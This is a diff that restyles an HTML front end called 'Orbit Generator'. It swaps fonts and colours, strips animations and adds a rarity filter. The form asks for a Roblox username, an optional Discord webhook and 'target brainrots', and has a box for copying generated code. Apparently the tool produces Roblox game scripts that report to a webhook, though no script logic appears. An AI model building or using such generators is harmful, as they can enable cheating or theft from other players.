@@ -4,312 +4,126 @@
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>Orbit Generator</title>
-<link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700;800;900&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Syne:wght@400;600;700;800;900&display=swap" rel="stylesheet"/>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
 :root{
-  --bg:#04020e;
-  --surface:rgba(10,6,24,0.87);
-  --border:rgba(139,92,246,0.13);
-  --border-hover:rgba(139,92,246,0.3);
-  --border-focus:rgba(167,139,250,0.55);
-  --accent:#8b5cf6;
-  --accent2:#c4b5fd;
-  --accent3:#a78bfa;
-  --glow:rgba(139,92,246,0.18);
+  --bg:#060606;
+  --surface:#0a0a0a;
+  --border:rgba(124,58,237,0.15);
+  --border-hover:rgba(124,58,237,0.35);
+  --border-focus:rgba(167,139,250,0.5);
+  --purple:#7c3aed;
+  --purple-light:#a78bfa;
+  --purple-pale:#c4b5fd;
   --text:#ede9fe;
-  --text-muted:rgba(196,181,253,0.55);
-  --text-dim:rgba(139,92,246,0.38);
-  --green:rgba(52,211,153,1);
-  --red:rgba(248,113,113,1);
-  --yellow:rgba(251,191,36,1);
+  --text-muted:rgba(196,181,253,0.5);
+  --text-dim:rgba(167,139,250,0.3);
 }
-html,body{background:var(--bg);color:var(--text);font-family:'Exo 2',sans-serif;min-height:100vh;line-height:1.5;overflow-x:hidden;}
-
-/* ── Animated background canvas ── */
-#bg-canvas{position:fixed;inset:0;z-index:0;pointer-events:none;}
-
-/* ── Aurora blobs ── */
-.aurora{position:fixed;z-index:0;pointer-events:none;border-radius:50%;filter:blur(90px);animation:drift 12s ease-in-out infinite alternate;}
-.aurora-1{width:600px;height:400px;background:radial-gradient(ellipse,rgba(109,40,217,0.13),transparent 70%);top:-100px;left:-100px;animation-delay:0s;}
-.aurora-2{width:500px;height:400px;background:radial-gradient(ellipse,rgba(139,92,246,0.1),transparent 70%);top:40%;right:-100px;animation-delay:-4s;}
-.aurora-3{width:400px;height:350px;background:radial-gradient(ellipse,rgba(167,139,250,0.09),transparent 70%);bottom:-80px;left:30%;animation-delay:-8s;}
-@keyframes drift{0%{transform:translate(0,0) scale(1);}50%{transform:translate(30px,20px) scale(1.08);}100%{transform:translate(-20px,10px) scale(0.95);}};
-
-/* ── Grid overlay ── */
-body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(139,92,246,0.025) 1px,transparent 1px),linear-gradient(90deg,rgba(139,92,246,0.025) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0;}
-
-/* ── Layout ── */
-body>div.wrap{position:relative;z-index:1;display:flex;justify-content:center;align-items:flex-start;padding:48px 16px 96px;min-height:100vh;}
-
-/* ── Card ── */
-.card{
-  width:100%;max-width:510px;
-  background:var(--surface);
-  border:1px solid var(--border);
-  border-radius:18px;
-  padding:32px 28px 28px;
-  backdrop-filter:blur(24px);
-  -webkit-backdrop-filter:blur(24px);
-  box-shadow:0 0 0 1px rgba(0,0,0,0.9),0 30px 80px rgba(0,0,0,0.75),0 0 80px rgba(139,92,246,0.05) inset;
-  animation:cardIn .6s cubic-bezier(.22,1,.36,1) both;
-}
-@keyframes cardIn{from{opacity:0;transform:translateY(22px);}to{opacity:1;transform:translateY(0);}}
-
-/* ── Header ── */
+html,body{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;min-height:100vh;line-height:1.5;}
+body{display:flex;justify-content:center;align-items:flex-start;padding:40px 16px 80px;position:relative;}
+body::before{content:'';position:fixed;top:-200px;left:50%;transform:translateX(-50%);width:700px;height:500px;background:radial-gradient(ellipse,rgba(124,58,237,0.09) 0%,transparent 65%);pointer-events:none;z-index:0;}
+body::after{content:'';position:fixed;inset:0;background-image:repeating-linear-gradient(0deg,transparent,transparent 28px,rgba(124,58,237,0.02) 28px,rgba(124,58,237,0.02) 29px);pointer-events:none;z-index:0;}
+.card{position:relative;z-index:1;width:100%;max-width:500px;background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:32px 28px;box-shadow:0 0 0 1px rgba(0,0,0,0.8),0 24px 60px rgba(0,0,0,0.7);}
 .header{margin-bottom:28px;}
-.header-logo{display:flex;align-items:center;gap:14px;margin-bottom:6px;}
-.logo-icon{
-  width:42px;height:42px;
-  background:rgba(139,92,246,0.1);
-  border:1px solid rgba(139,92,246,0.28);
-  border-radius:12px;
-  display:flex;align-items:center;justify-content:center;
-  box-shadow:0 0 18px rgba(139,92,246,0.14);
-  animation:pulseIcon 3s ease-in-out infinite;
-}
-@keyframes pulseIcon{0%,100%{box-shadow:0 0 18px rgba(139,92,246,0.14);}50%{box-shadow:0 0 28px rgba(139,92,246,0.32);}}
-.logo-icon svg{filter:drop-shadow(0 0 6px rgba(167,139,250,0.65));}
-.title{font-size:30px;font-weight:900;letter-spacing:-1.5px;color:#fff;line-height:1;text-shadow:0 0 30px rgba(79,158,255,0.3);}
-.title em{font-style:normal;background:linear-gradient(90deg,var(--accent2),var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
-.subtitle{font-family:'Space Mono',monospace;font-size:10px;color:var(--text-dim);letter-spacing:.15em;margin-top:5px;text-transform:uppercase;}
-
-/* ── Fields ── */
+.header-logo{display:flex;align-items:center;gap:12px;margin-bottom:4px;}
+.logo-icon{width:38px;height:38px;background:rgba(124,58,237,0.15);border:1px solid rgba(124,58,237,0.3);border-radius:10px;display:flex;align-items:center;justify-content:center;}
+.title{font-size:28px;font-weight:900;letter-spacing:-1px;color:#fff;line-height:1;}
+.title em{font-style:normal;color:var(--purple-light);}
+.subtitle{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--text-dim);letter-spacing:.1em;margin-top:6px;text-transform:uppercase;}
 .fields{display:flex;flex-direction:column;gap:16px;}
-.field{display:flex;flex-direction:column;gap:7px;animation:fieldIn .5s cubic-bezier(.22,1,.36,1) both;}
-.field:nth-child(1){animation-delay:.05s;}
-.field:nth-child(2){animation-delay:.1s;}
-.field:nth-child(3){animation-delay:.15s;}
-.field:nth-child(4){animation-delay:.2s;}
-.field:nth-child(5){animation-delay:.25s;}
-@keyframes fieldIn{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
-
-.label{
-  font-family:'Space Mono',monospace;
-  font-size:9.5px;font-weight:700;
-  letter-spacing:.18em;
-  color:var(--text-muted);
-  text-transform:uppercase;
-  display:flex;align-items:center;gap:6px;
-}
+.field{display:flex;flex-direction:column;gap:6px;}
+.label{font-family:'IBM Plex Mono',monospace;font-size:10px;font-weight:600;letter-spacing:.14em;color:var(--text-muted);text-transform:uppercase;display:flex;align-items:center;gap:6px;}
 .label .opt{color:var(--text-dim);font-weight:400;}
-.label .dot{width:5px;height:5px;border-radius:50%;background:var(--accent);box-shadow:0 0 6px var(--accent);flex-shrink:0;}
-
-/* ── Inputs ── */
 .input-wrap{position:relative;}
-.input-icon{position:absolute;left:13px;top:50%;transform:translateY(-50%);color:var(--text-dim);pointer-events:none;display:flex;}
-input[type="text"],input[type="password"]{
-  width:100%;
-  background:rgba(0,5,20,0.7);
-  border:1px solid var(--border);
-  border-radius:10px;
-  padding:11px 14px;
-  font-family:'Exo 2',sans-serif;
-  font-size:14px;font-weight:500;
-  color:var(--text);
-  outline:none;
-  transition:border-color .2s,box-shadow .2s,background .2s;
-}
-input[type="text"]:hover,input[type="password"]:hover{border-color:var(--border-hover);background:rgba(10,0,28,0.8);}
-input[type="text"]:focus,input[type="password"]:focus{border-color:var(--border-focus);box-shadow:0 0 0 3px rgba(139,92,246,.07),0 0 20px rgba(139,92,246,.06) inset;background:rgba(10,0,30,0.9);}
-input::placeholder{font-family:'Space Mono',monospace;font-size:10.5px;color:var(--text-dim);}
-.has-icon input{padding-left:37px;}
-
-.userid-hint{font-family:'Space Mono',monospace;font-size:10px;color:var(--text-dim);}
-.userid-hint span{color:var(--accent2);filter:drop-shadow(0 0 4px var(--accent));}
-
-/* ── Dropdown ── */
-.dropdown{position:absolute;top:calc(100% + 5px);left:0;right:0;background:rgba(8,4,20,0.97);border:1px solid rgba(139,92,246,.2);border-radius:11px;overflow:hidden;z-index:200;box-shadow:0 16px 48px rgba(0,0,0,.85),0 0 30px rgba(139,92,246,.05);display:none;backdrop-filter:blur(16px);}
-.dropdown.open{display:block;animation:dropIn .18s cubic-bezier(.22,1,.36,1);}
-@keyframes dropIn{from{opacity:0;transform:translateY(-6px);}to{opacity:1;transform:translateY(0);}}
-.dd-item{display:flex;align-items:center;gap:10px;padding:10px 14px;cursor:pointer;border-bottom:1px solid rgba(139,92,246,.06);transition:background .12s;}
+.input-icon{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--text-dim);pointer-events:none;display:flex;}
+input[type="text"],input[type="password"]{width:100%;background:#000;border:1px solid var(--border);border-radius:10px;padding:11px 14px;font-family:'Syne',sans-serif;font-size:14px;color:var(--text);outline:none;transition:border-color .15s,box-shadow .15s;}
+input[type="text"]:hover,input[type="password"]:hover{border-color:var(--border-hover);}
+input[type="text"]:focus,input[type="password"]:focus{border-color:var(--border-focus);box-shadow:0 0 0 3px rgba(124,58,237,.08);}
+input::placeholder{font-family:'IBM Plex Mono',monospace;font-size:11.5px;color:var(--text-dim);}
+.has-icon input{padding-left:36px;}
+.userid-hint{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--text-dim);margin-top:2px;}
+.userid-hint span{color:var(--purple-light);}
+.dropdown{position:absolute;top:calc(100% + 4px);left:0;right:0;background:#080808;border:1px solid rgba(124,58,237,.2);border-radius:10px;overflow:hidden;z-index:200;box-shadow:0 12px 40px rgba(0,0,0,.8);display:none;}
+.dropdown.open{display:block;}
+.dd-item{display:flex;align-items:center;gap:10px;padding:10px 14px;cursor:pointer;border-bottom:1px solid rgba(124,58,237,.06);transition:background .1s;}
 .dd-item:last-child{border-bottom:none;}
-.dd-item:hover{background:rgba(139,92,246,.07);}
-.dd-avatar{width:28px;height:28px;border-radius:50%;background:rgba(139,92,246,.12);border:1px solid rgba(139,92,246,.22);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:var(--accent2);flex-shrink:0;}
-.dd-name{font-size:13px;font-weight:700;color:#fff;}
-.dd-id{font-family:'Space Mono',monospace;font-size:10px;color:var(--text-dim);}
-
-/* ── Mode buttons ── */
+.dd-item:hover{background:rgba(124,58,237,.07);}
+.dd-avatar{width:28px;height:28px;border-radius:50%;background:rgba(124,58,237,.15);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--purple-light);flex-shrink:0;}
+.dd-name{font-size:13px;font-weight:600;color:#fff;}
+.dd-id{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--text-dim);}
 .mode-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:7px;}
-.mode-btn{
-  padding:11px 6px;
-  background:rgba(0,5,20,0.7);
-  border:1px solid var(--border);
-  border-radius:9px;
-  font-family:'Space Mono',monospace;
-  font-size:10px;font-weight:700;
-  letter-spacing:.08em;
-  color:var(--text-dim);
-  cursor:pointer;
-  transition:all .18s;
-  text-align:center;
-  position:relative;overflow:hidden;
-}
-.mode-btn::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(139,92,246,.07),transparent);opacity:0;transition:opacity .18s;}
-.mode-btn:hover{border-color:var(--border-hover);color:var(--accent2);}
-.mode-btn:hover::before{opacity:1;}
-.mode-btn.active{
-  background:rgba(139,92,246,.12);
-  border-color:rgba(139,92,246,.48);
-  color:var(--accent2);
-  box-shadow:0 0 16px rgba(139,92,246,.14),0 0 6px rgba(139,92,246,.1) inset;
-  text-shadow:0 0 10px rgba(167,139,250,.7);
-}
-.mode-btn.active::before{opacity:1;}
-
-/* ── Brainrot panel ── */
-.brot-btn{
-  width:100%;background:rgba(0,5,20,0.7);border:1px solid var(--border);border-radius:10px;
-  padding:11px 14px;display:flex;align-items:center;justify-content:space-between;
-  cursor:pointer;font-family:'Exo 2',sans-serif;font-size:14px;font-weight:500;
-  color:var(--text-dim);transition:border-color .18s,box-shadow .18s;
-}
+.mode-btn{padding:10px 6px;background:#000;border:1px solid var(--border);border-radius:9px;font-family:'IBM Plex Mono',monospace;font-size:11px;font-weight:600;letter-spacing:.06em;color:var(--text-dim);cursor:pointer;transition:all .15s;text-align:center;}
+.mode-btn:hover{border-color:var(--border-hover);color:var(--purple-pale);}
+.mode-btn.active{background:rgba(124,58,237,.12);border-color:rgba(124,58,237,.45);color:var(--purple-pale);}
+.brot-btn{width:100%;background:#000;border:1px solid var(--border);border-radius:10px;padding:11px 14px;display:flex;align-items:center;justify-content:space-between;cursor:pointer;font-family:'Syne',sans-serif;font-size:14px;color:var(--text-dim);transition:border-color .15s;}
 .brot-btn:hover{border-color:var(--border-hover);}
-.brot-btn.has-sel{color:var(--accent2);box-shadow:0 0 16px rgba(139,92,246,.07);}
-.chevron{transition:transform .22s;flex-shrink:0;color:var(--text-dim);}
+.brot-btn.has-sel{color:var(--purple-pale);}
+.chevron{transition:transform .2s;flex-shrink:0;}
 .chevron.open{transform:rotate(180deg);}
-.brot-panel{background:rgba(6,2,16,0.92);border:1px solid rgba(139,92,246,.15);border-radius:10px;overflow:hidden;display:none;backdrop-filter:blur(12px);}
-.brot-panel.open{display:block;animation:dropIn .18s cubic-bezier(.22,1,.36,1);}
-.brot-search-wrap{padding:8px;border-bottom:1px solid rgba(139,92,246,.08);}
+.brot-panel{background:#080808;border:1px solid rgba(124,58,237,.15);border-radius:10px;overflow:hidden;display:none;}
+.brot-panel.open{display:block;}
+.brot-search-wrap{padding:8px;border-bottom:1px solid rgba(124,58,237,.08);}
 .brot-search-wrap input{font-size:12px;padding:8px 10px;}
-.brot-list{max-height:185px;overflow-y:auto;}
-.brot-item{display:flex;align-items:center;gap:10px;padding:9px 14px;cursor:pointer;border-bottom:1px solid rgba(139,92,246,.05);transition:background .1s;}
+.brot-list{max-height:190px;overflow-y:auto;}
+.brot-item{display:flex;align-items:center;gap:10px;padding:9px 14px;cursor:pointer;border-bottom:1px solid rgba(124,58,237,.04);transition:background .1s;}
 .brot-item:last-child{border-bottom:none;}
-.brot-item:hover{background:rgba(139,92,246,.06);}
-.brot-check{width:15px;height:15px;border:1px solid rgba(139,92,246,.22);border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:9px;color:transparent;transition:all .14s;}
-.brot-check.on{background:rgba(139,92,246,.2);border-color:var(--accent);color:var(--accent2);box-shadow:0 0 6px rgba(139,92,246,.35);}
-.brot-name{flex:1;font-size:13px;font-weight:500;color:rgba(200,220,255,.65);}
-.brot-rarity{font-family:'Space Mono',monospace;font-size:9px;color:var(--text-dim);}
-.tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:4px;}
-.tag{
-  display:inline-flex;align-items:center;gap:5px;
-  padding:3px 9px 3px 9px;
-  background:rgba(139,92,246,.09);
-  border:1px solid rgba(139,92,246,.24);
-  border-radius:20px;
-  font-size:10.5px;
-  font-family:'Space Mono',monospace;
-  color:var(--accent2);
-  animation:tagPop .2s cubic-bezier(.22,1,.36,1);
-}
-@keyframes tagPop{from{opacity:0;transform:scale(.8);}to{opacity:1;transform:scale(1);}}
+.brot-item:hover{background:rgba(124,58,237,.05);}
+.brot-check{width:15px;height:15px;border:1px solid rgba(124,58,237,.25);border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:9px;color:transparent;transition:all .12s;}
+.brot-check.on{background:rgba(124,58,237,.25);border-color:var(--purple);color:var(--purple-pale);}
+.brot-name{flex:1;font-size:13px;color:rgba(200,185,255,.7);}
+.brot-rarity{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--text-dim);}
+.tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:6px;}
+.tag{display:inline-flex;align-items:center;gap:5px;padding:3px 9px 3px 8px;background:rgba(124,58,237,.1);border:1px solid rgba(124,58,237,.25);border-radius:20px;font-size:11px;font-family:'IBM Plex Mono',monospace;color:var(--purple-pale);}
 .tag-x{cursor:pointer;color:var(--text-dim);font-size:14px;line-height:1;transition:color .1s;}
-.tag-x:hover{color:var(--red);}
-
-/* ── Toggle ── */
-.toggle-row{
-  display:flex;align-items:center;justify-content:space-between;
-  background:rgba(0,5,20,0.7);border:1px solid var(--border);border-radius:10px;padding:12px 14px;
-}
-.toggle-name{font-size:13px;font-weight:700;color:rgba(196,181,253,.75);}
-.toggle-sub{font-family:'Space Mono',monospace;font-size:9.5px;color:var(--text-dim);margin-top:2px;}
-.switch{width:44px;height:24px;background:rgba(139,92,246,.05);border:1px solid rgba(139,92,246,.15);border-radius:12px;cursor:pointer;position:relative;transition:all .22s;flex-shrink:0;}
-.switch::after{content:'';position:absolute;top:3px;left:3px;width:16px;height:16px;background:rgba(139,92,246,.3);border-radius:50%;transition:all .22s;}
-.switch.on{background:rgba(139,92,246,.2);border-color:rgba(139,92,246,.5);box-shadow:0 0 14px rgba(139,92,246,.18);}
-.switch.on::after{left:23px;background:var(--accent2);box-shadow:0 0 10px rgba(167,139,250,.75);}
-
-/* ── Divider ── */
-.divider{height:1px;background:linear-gradient(90deg,transparent,rgba(139,92,246,.14),transparent);}
-
-/* ── Generate button ── */
-.gen-btn{
-  width:100%;padding:15px;
-  background:rgba(139,92,246,.1);
-  border:1px solid rgba(139,92,246,.36);
-  border-radius:11px;
-  font-family:'Exo 2',sans-serif;font-size:15px;font-weight:800;letter-spacing:.04em;
-  color:var(--accent2);
-  cursor:pointer;
-  transition:all .2s;
-  position:relative;overflow:hidden;
-}
-.gen-btn::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(139,92,246,.1) 0%,rgba(167,139,250,.05) 100%);pointer-events:none;}
-.gen-btn::after{
-  content:'';position:absolute;top:0;left:-100%;width:60%;height:100%;
-  background:linear-gradient(90deg,transparent,rgba(255,255,255,.05),transparent);
-  transition:left .5s;
-}
-.gen-btn:hover:not(:disabled)::after{left:140%;}
-.gen-btn:hover:not(:disabled){
-  background:rgba(139,92,246,.2);
-  border-color:rgba(167,139,250,.6);
-  transform:translateY(-2px);
-  box-shadow:0 8px 30px rgba(139,92,246,.22),0 0 0 1px rgba(139,92,246,.1);
-}
+.tag-x:hover{color:var(--purple-pale);}
+.toggle-row{display:flex;align-items:center;justify-content:space-between;background:#000;border:1px solid var(--border);border-radius:10px;padding:11px 14px;}
+.toggle-name{font-size:13px;font-weight:600;color:rgba(200,185,255,.65);}
+.toggle-sub{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--text-dim);margin-top:1px;}
+.switch{width:42px;height:23px;background:rgba(124,58,237,.08);border:1px solid rgba(124,58,237,.18);border-radius:12px;cursor:pointer;position:relative;transition:all .2s;flex-shrink:0;}
+.switch::after{content:'';position:absolute;top:3px;left:3px;width:15px;height:15px;background:rgba(167,139,250,.35);border-radius:50%;transition:all .2s;}
+.switch.on{background:rgba(124,58,237,.22);border-color:rgba(124,58,237,.5);}
+.switch.on::after{left:22px;background:var(--purple-light);box-shadow:0 0 8px rgba(124,58,237,.6);}
+.divider{height:1px;background:rgba(124,58,237,.08);}
+.gen-btn{width:100%;padding:14px;background:rgba(124,58,237,.15);border:1px solid rgba(124,58,237,.4);border-radius:11px;font-family:'Syne',sans-serif;font-size:15px;font-weight:800;letter-spacing:.02em;color:var(--purple-pale);cursor:pointer;transition:all .18s;position:relative;overflow:hidden;}
+.gen-btn::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(167,139,250,.07) 0%,transparent 55%);pointer-events:none;}
+.gen-btn:hover:not(:disabled){background:rgba(124,58,237,.25);border-color:rgba(167,139,250,.55);transform:translateY(-1px);box-shadow:0 6px 24px rgba(124,58,237,.22);}
 .gen-btn:active:not(:disabled){transform:translateY(0);}
-.gen-btn:disabled{background:rgba(139,92,246,.03);border-color:rgba(139,92,246,.08);color:rgba(139,92,246,.22);cursor:not-allowed;}
-
-/* ── Status bar ── */
+.gen-btn:disabled{background:rgba(124,58,237,.04);border-color:rgba(124,58,237,.1);color:rgba(124,58,237,.25);cursor:not-allowed;}
 .status-bar{display:none;flex-direction:column;gap:6px;}
 .status-bar.visible{display:flex;}
-.status-step{
-  display:flex;align-items:center;gap:10px;
-  font-family:'Space Mono',monospace;font-size:11px;
-  color:var(--text-dim);padding:8px 12px;
-  background:rgba(4,0,14,.7);
-  border:1px solid rgba(139,92,246,.08);
-  border-radius:8px;
-  transition:all .25s;
-}
-.status-step.active{border-color:rgba(139,92,246,.32);color:var(--accent2);background:rgba(139,92,246,.06);box-shadow:0 0 16px rgba(139,92,246,.07);}
-.status-step.done{border-color:rgba(52,211,153,.25);color:rgba(52,211,153,.8);background:rgba(52,211,153,.04);}
-.status-step.err{border-color:rgba(248,113,113,.25);color:rgba(248,113,113,.8);background:rgba(248,113,113,.04);}
+.status-step{display:flex;align-items:center;gap:10px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--text-dim);padding:8px 12px;background:#000;border:1px solid rgba(124,58,237,.1);border-radius:8px;transition:all .2s;}
+.status-step.active{border-color:rgba(124,58,237,.3);color:var(--purple-pale);background:rgba(124,58,237,.05);}
+.status-step.done{border-color:rgba(52,211,153,.2);color:rgba(52,211,153,.7);background:rgba(52,211,153,.03);}
+.status-step.err{border-color:rgba(248,113,113,.2);color:rgba(248,113,113,.7);background:rgba(248,113,113,.03);}
 .step-icon{flex-shrink:0;width:16px;text-align:center;}
-.spin{display:inline-block;animation:spin .7s linear infinite;}
+.spin{display:inline-block;animation:spin .8s linear infinite;}
 @keyframes spin{to{transform:rotate(360deg);}}
-
-/* ── Output ── */
-.output-wrap{display:none;flex-direction:column;gap:8px;}
-.output-wrap.visible{display:flex;animation:fadeUp .35s cubic-bezier(.22,1,.36,1);}
-@keyframes fadeUp{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
+.output-wrap{display:none;flex-direction:column;gap:8px;animation:fadeUp .3s ease;}
+.output-wrap.visible{display:flex;}
+@keyframes fadeUp{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
 .output-header{display:flex;align-items:center;justify-content:space-between;}
-.output-label{font-family:'Space Mono',monospace;font-size:9px;font-weight:700;letter-spacing:.16em;color:var(--text-dim);text-transform:uppercase;}
-.output-label span{color:var(--green);filter:drop-shadow(0 0 4px var(--green));}
-.copy-btn{
-  padding:4px 13px;
-  background:transparent;
-  border:1px solid rgba(139,92,246,.22);
-  border-radius:6px;
-  font-family:'Space Mono',monospace;font-size:9px;font-weight:700;letter-spacing:.08em;
-  color:var(--text-dim);
-  cursor:pointer;transition:all .15s;
-}
-.copy-btn:hover{border-color:var(--border-focus);color:var(--accent2);}
-.copy-btn.ok{border-color:rgba(52,211,153,.4);color:rgba(52,211,153,.9);}
-.code-box{
-  background:rgba(2,0,10,.9);border:1px solid rgba(139,92,246,.1);border-radius:10px;
-  padding:14px 16px;
-  font-family:'Space Mono',monospace;font-size:11.5px;
-  color:rgba(196,181,253,.65);
-  line-height:1.75;max-height:180px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;
-}
-
-/* ── Alert ── */
-.alert{display:none;align-items:flex-start;gap:8px;padding:10px 12px;border-radius:8px;font-family:'Space Mono',monospace;font-size:10.5px;line-height:1.5;}
+.output-label{font-family:'IBM Plex Mono',monospace;font-size:10px;font-weight:600;letter-spacing:.12em;color:var(--text-dim);text-transform:uppercase;}
+.copy-btn{padding:4px 13px;background:transparent;border:1px solid rgba(124,58,237,.25);border-radius:6px;font-family:'IBM Plex Mono',monospace;font-size:10px;font-weight:600;letter-spacing:.06em;color:var(--text-dim);cursor:pointer;transition:all .15s;}
+.copy-btn:hover{border-color:var(--border-focus);color:var(--purple-pale);}
+.copy-btn.ok{border-color:rgba(52,211,153,.35);color:rgba(52,211,153,.8);}
+.code-box{background:#000;border:1px solid rgba(124,58,237,.12);border-radius:10px;padding:14px 16px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:rgba(196,181,253,.65);line-height:1.7;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;}
+.alert{display:none;align-items:flex-start;gap:8px;padding:10px 12px;border-radius:8px;font-family:'IBM Plex Mono',monospace;font-size:11.5px;line-height:1.5;}
 .alert.visible{display:flex;}
-.alert.warn{background:rgba(251,191,36,.04);border:1px solid rgba(251,191,36,.18);color:rgba(251,191,36,.8);}
-.alert.err{background:rgba(248,113,113,.04);border:1px solid rgba(248,113,113,.18);color:rgba(248,113,113,.8);}
-
-/* ── Scrollbar ── */
+.alert.warn{background:rgba(251,191,36,.05);border:1px solid rgba(251,191,36,.2);color:rgba(251,191,36,.75);}
+.alert.err{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);color:rgba(248,113,113,.75);}
 ::-webkit-scrollbar{width:4px;}
 ::-webkit-scrollbar-track{background:transparent;}
-::-webkit-scrollbar-thumb{background:rgba(139,92,246,.2);border-radius:2px;}
-::-webkit-scrollbar-thumb:hover{background:rgba(139,92,246,.36);}
+::-webkit-scrollbar-thumb{background:rgba(124,58,237,.2);border-radius:2px;}
 </style>
 </head>
 <body>
 
-<canvas id="bg-canvas"></canvas>
-<div class="aurora aurora-1"></div>
-<div class="aurora aurora-2"></div>
-<div class="aurora aurora-3"></div>
-
-<div class="wrap">
 <div class="card">
   <div class="header">
     <div class="header-logo">
       <div class="logo-icon">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
           <circle cx="12" cy="12" r="3"/>
           <path d="M12 2a10 10 0 0 1 10 10"/>
           <path d="M12 22a10 10 0 0 1-10-10"/>
@@ -326,7 +140,7 @@ input::placeholder{font-family:'Space Mono',monospace;font-size:10.5px;color:var
 
     <!-- Username -->
     <div class="field">
-      <div class="label"><span class="dot"></span>Roblox Username</div>
+      <div class="label">Roblox Username</div>
       <div class="input-wrap has-icon" id="search-wrap">
         <div class="input-icon">
           <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
@@ -339,13 +153,15 @@ input::placeholder{font-family:'Space Mono',monospace;font-size:10.5px;color:var
 
     <!-- Webhook -->
     <div class="field">
-      <div class="label"><span class="dot" style="background:var(--text-dim);box-shadow:none;"></span>Discord Webhook <span class="opt">(optional)</span></div>
+      <div class="label">Discord Webhook <span class="opt">(optional)</span></div>
       <input type="text" id="webhook-input" placeholder="https://discord.com/api/webhooks/..."/>
     </div>
 
+
+
     <!-- Brainrots -->
     <div class="field">
-      <div class="label"><span class="dot"></span>Target Brainrots</div>
+      <div class="label">Target Brainrots</div>
       <button class="brot-btn" id="brot-toggle">
         <span id="brot-label">Select brainrots to target...</span>
         <svg class="chevron" id="brot-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
@@ -354,6 +170,17 @@ input::placeholder{font-family:'Space Mono',monospace;font-size:10.5px;color:var
         <div class="brot-search-wrap">
           <input type="text" id="brot-search" placeholder="search brainrots..."/>
         </div>
+        <div class="rarity-filter-row" id="rarity-filter-row" style="display:flex;flex-wrap:wrap;gap:4px;padding:6px 8px;border-bottom:1px solid rgba(124,58,237,.08);">
+          <button class="rf-btn active" data-rarity="ALL" style="font-family:'IBM Plex Mono',monospace;font-size:9px;padding:3px 7px;border-radius:6px;border:1px solid rgba(124,58,237,.3);background:rgba(124,58,237,.15);color:#a78bfa;cursor:pointer;">ALL</button>
+          <button class="rf-btn" data-rarity="Common" style="font-family:'IBM Plex Mono',monospace;font-size:9px;padding:3px 7px;border-radius:6px;border:1px solid rgba(180,180,180,.25);background:transparent;color:rgba(180,180,180,0.6);cursor:pointer;">COMMON</button>
+          <button class="rf-btn" data-rarity="Rare" style="font-family:'IBM Plex Mono',monospace;font-size:9px;padding:3px 7px;border-radius:6px;border:1px solid rgba(96,165,250,.3);background:transparent;color:rgba(96,165,250,0.75);cursor:pointer;">RARE</button>
+          <button class="rf-btn" data-rarity="Epic" style="font-family:'IBM Plex Mono',monospace;font-size:9px;padding:3px 7px;border-radius:6px;border:1px solid rgba(167,139,250,.35);background:transparent;color:rgba(167,139,250,0.85);cursor:pointer;">EPIC</button>
+          <button class="rf-btn" data-rarity="Legendary" style="font-family:'IBM Plex Mono',monospace;font-size:9px;padding:3px 7px;border-radius:6px;border:1px solid rgba(251,191,36,.35);background:transparent;color:rgba(251,191,36,0.85);cursor:pointer;">LEGENDARY</button>
+          <button class="rf-btn" data-rarity="Mythic" style="font-family:'IBM Plex Mono',monospace;font-size:9px;padding:3px 7px;border-radius:6px;border:1px solid rgba(251,113,133,.35);background:transparent;color:rgba(251,113,133,0.85);cursor:pointer;">MYTHIC</button>
+          <button class="rf-btn" data-rarity="Brainrot God" style="font-family:'IBM Plex Mono',monospace;font-size:9px;padding:3px 7px;border-radius:6px;border:1px solid rgba(250,160,50,.35);background:transparent;color:rgba(250,160,50,0.95);cursor:pointer;">GOD</button>
+          <button class="rf-btn" data-rarity="Secret" style="font-family:'IBM Plex Mono',monospace;font-size:9px;padding:3px 7px;border-radius:6px;border:1px solid rgba(52,211,153,.35);background:transparent;color:rgba(52,211,153,0.9);cursor:pointer;">SECRET</button>
